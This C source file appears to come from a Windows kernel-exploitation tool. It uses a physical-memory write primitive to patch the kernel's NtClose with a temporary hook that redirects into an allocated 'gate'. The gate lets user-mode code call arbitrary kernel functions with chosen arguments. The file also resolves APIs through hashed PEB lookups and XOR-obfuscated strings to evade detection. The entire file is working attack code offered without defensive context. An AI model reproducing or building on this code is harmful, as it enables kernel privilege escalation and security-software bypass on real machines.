/* безликий */
#include "gate.h"
#include "shellcode.h"
#include "krw.h"
#include "peb.h"
#include "crypt.h"
#include "log.h"
#include <string.h>

typedef int64_t (*PNtClose)(HANDLE);
static PNtClose g_ntclose_fn = NULL;
static HANDLE g_dead_handle  = NULL;

static void init_dead_handle(void)
{
    typedef HANDLE(__stdcall *PCreateEventW)(void *, int, int, void *);
    typedef int(__stdcall *PCloseHandle)(HANDLE);

    void *k32 = Peb_FindModule(H_kernel32_dll);
    if (!k32) return;
    PCreateEventW create_ev = (PCreateEventW)Peb_FindExport(k32, H_CreateEventW);
    PCloseHandle close_h    = (PCloseHandle)Peb_FindExport(k32, H_CloseHandle);
    if (!create_ev || !close_h) return;

    HANDLE h = create_ev(NULL, 0, 0, NULL);
    if (h) {
        close_h(h);
        g_dead_handle = h;
    }
}

static void *load_ntos_image(void)
{
    wchar_t ntos_path[16];
    static const uint8_t xw_ntos[] = {0x25, 0x4B, 0x3F, 0x4B, 0x24, 0x4B, 0x38, 0x4B,
                                       0x20, 0x4B, 0x39, 0x4B, 0x25, 0x4B, 0x27, 0x4B,
                                       0x65, 0x4B, 0x2E, 0x4B, 0x33, 0x4B, 0x2E, 0x4B};
    xs_dec_w(ntos_path, xw_ntos, 12);
    return Peb_LoadImage(ntos_path);
}

VirtAddr Nk_ResolveExport(SxInfo *ki, uint32_t name_hash)
{
    void *local = load_ntos_image();
    if (!local) return 0;
    void *proc = Peb_FindExport(local, name_hash);
    if (!proc) {
        Peb_UnloadImage(local);
        return 0;
    }
    uint32_t rva = (uint32_t)((uintptr_t)proc - (uintptr_t)local);
    Peb_UnloadImage(local);
    return ki->ntos_base + rva;
}

static Result hook_install(NkCtx *ctx)
{
    uint8_t hook[NK_HOOK_SIZE];
    memcpy(hook, NK_HOOK, NK_HOOK_SIZE);
    memcpy(hook + 2, &ctx->gate_va, 8);
    return Zv_PhysWrite(ctx->tbt, ctx->nt_close_pa, hook, NK_HOOK_SIZE);
}

static Result hook_remove(NkCtx *ctx)
{
    return Zv_PhysWrite(ctx->tbt, ctx->nt_close_pa, ctx->original_bytes, NK_HOOK_SIZE);
}

Result Nk_Init(NkCtx *ctx, ZvCtx *tbt, SxInfo *ki)
{
    memset(ctx, 0, sizeof(*ctx));
    ctx->tbt = tbt;

    void *ntdll = Peb_FindModule(H_ntdll_dll);
    g_ntclose_fn = (PNtClose)Peb_FindExport(ntdll, H_NtClose);
    if (!g_ntclose_fn) return ERR(STATUS_ERR_GATE_INSTALL, EMSG("NtClose not in ntdll"));

    init_dead_handle();
    if (!g_dead_handle) g_dead_handle = (HANDLE)(uintptr_t)0xDEAD;

    void *ntos_local = load_ntos_image();
    if (!ntos_local) return ERR(STATUS_ERR_GATE_INSTALL, EMSG("ntos load failed"));

    void *ntclose_proc = Peb_FindExport(ntos_local, H_NtClose);
    void *psthread_proc = Peb_FindExport(ntos_local, H_PsGetCurrentThread);

    if (!ntclose_proc || !psthread_proc) {
        Peb_UnloadImage(ntos_local);
        return ERR(STATUS_ERR_GATE_INSTALL, EMSG("export resolve failed"));
    }

    uint32_t ntclose_rva   = (uint32_t)((uintptr_t)ntclose_proc - (uintptr_t)ntos_local);
    uint32_t psthread_rva  = (uint32_t)((uintptr_t)psthread_proc - (uintptr_t)ntos_local);
    Peb_UnloadImage(ntos_local);

    ctx->nt_close_va = ki->ntos_base + ntclose_rva;
    VirtAddr ps_get_thread = ki->ntos_base + psthread_rva;

    TRY(Zv_VirtToPhys(tbt, ctx->nt_close_va, &ctx->nt_close_pa));
    LOG_INF("NtClose: VA=0x%llX PA=0x%llX", ctx->nt_close_va, ctx->nt_close_pa);

    TRY(Zv_PhysRead(tbt, ctx->nt_close_pa, ctx->original_bytes, 32));

    TRY(Zv_AllocContig(tbt, NK_SIZE, &ctx->gate_va, &ctx->gate_pa));
    LOG_INF("gate pool: VA=0x%llX PA=0x%llX", ctx->gate_va, ctx->gate_pa);

    uint8_t gate[NK_SIZE];
    memcpy(gate, NK_TEMPLATE, NK_SIZE);
    memcpy(gate + NK_OFF_ORIG, ctx->original_bytes, 16);

    uint64_t ret_addr = ctx->nt_close_va + 16;
    memcpy(gate + NK_OFF_RETURN, &ret_addr, 8);

    uint64_t zero_kthread = 0;
    memcpy(gate + NK_OFF_KTHREAD, &zero_kthread, 8);
    memcpy(gate + NK_OFF_TARGET, &ps_get_thread, 8);
    gate[0x12] = 0x90;
    gate[0x13] = 0x90;

    TRY(Zv_PhysWrite(tbt, ctx->gate_pa, gate, NK_SIZE));
    TRY(hook_install(ctx));

    int64_t kthread = g_ntclose_fn(g_dead_handle);

    TRY(hook_remove(ctx));

    if (kthread == 0)
        return ERR(STATUS_ERR_GATE_INSTALL, EMSG("PsGetCurrentThread returned 0"));
    ctx->kthread = (uint64_t)kthread;
    LOG_INF("KTHREAD: 0x%llX", ctx->kthread);

    memcpy(gate, NK_TEMPLATE, NK_SIZE);
    memcpy(gate + NK_OFF_ORIG, ctx->original_bytes, 16);
    memcpy(gate + NK_OFF_RETURN, &ret_addr, 8);
    memcpy(gate + NK_OFF_KTHREAD, &ctx->kthread, 8);
    memcpy(gate + NK_OFF_TARGET, &ps_get_thread, 8);

    TRY(Zv_PhysWrite(tbt, ctx->gate_pa, gate, NK_SIZE));

    ctx->last_target = ps_get_thread;
    ctx->ready       = true;
    LOG_INF("NtClose gate ready (no persistent hook)");
    return OK_VOID;
}

Result Nk_Call(NkCtx *ctx, VirtAddr target, uint64_t arg1, uint64_t arg2,
               uint64_t arg3, uint64_t *ret)
{
    if (!ctx->ready) return ERR(STATUS_ERR_GATE_CALL, EMSG("gate not initialized"));

    if (target != ctx->last_target) {
        uint8_t data[32];
        memcpy(data + 0, &target, 8);
        memcpy(data + 8, &arg1, 8);
        memcpy(data + 16, &arg2, 8);
        memcpy(data + 24, &arg3, 8);
        TRY(Zv_PhysWrite(ctx->tbt, ctx->gate_pa + NK_OFF_TARGET, data, 32));
        ctx->last_target = target;
    } else {
        uint8_t args[24];
        memcpy(args + 0, &arg1, 8);
        memcpy(args + 8, &arg2, 8);
        memcpy(args + 16, &arg3, 8);
        TRY(Zv_PhysWrite(ctx->tbt, ctx->gate_pa + NK_OFF_ARG1, args, 24));
    }

    TRY(hook_install(ctx));

    int64_t status = g_ntclose_fn(g_dead_handle);

    TRY(hook_remove(ctx));

    if (ret) *ret = (uint64_t)status;
    return OK_VOID;
}

Result Nk_Cleanup(NkCtx *ctx)
{
    if (!ctx->ready) return OK_VOID;
    ctx->ready = false;
    TRY(Zv_FreeContig(ctx->tbt, ctx->gate_va));
    LOG_INF("NtClose gate freed");
    return OK_VOID;
}
